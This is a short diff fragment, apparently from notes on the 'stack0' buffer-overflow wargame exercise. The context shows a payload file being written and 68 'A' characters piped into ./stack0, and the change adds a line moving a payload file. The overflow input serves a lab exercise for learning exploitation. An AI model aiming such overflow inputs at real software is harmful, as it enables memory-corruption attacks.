@@ -9,7 +9,8 @@
   open('payload_one','wb').write(payload)
 
   python -c "print('A'*68)" | ./stack0
-  
+
+  mv ../payload $PWD  
 
   ```
   
